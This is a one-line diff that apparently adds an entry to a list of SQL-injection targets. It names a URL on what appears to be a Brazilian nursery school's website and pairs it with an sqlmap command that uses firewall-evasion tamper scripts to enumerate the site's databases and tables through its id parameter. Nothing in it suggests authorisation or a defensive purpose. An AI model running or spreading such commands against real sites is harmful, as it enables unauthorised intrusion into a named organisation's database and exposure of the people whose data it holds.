@@ -1,0 +1,1 @@
+https://www.bercarioescolaluz.com.br/perfil.php?id=441 (GET)  # sqlmap.py --tamper modsecurityzeroversioned,space2comment -u https://www.bercarioescolaluz.com.br/perfil.php?id=441 --dbs --tables --threads 5 -v3
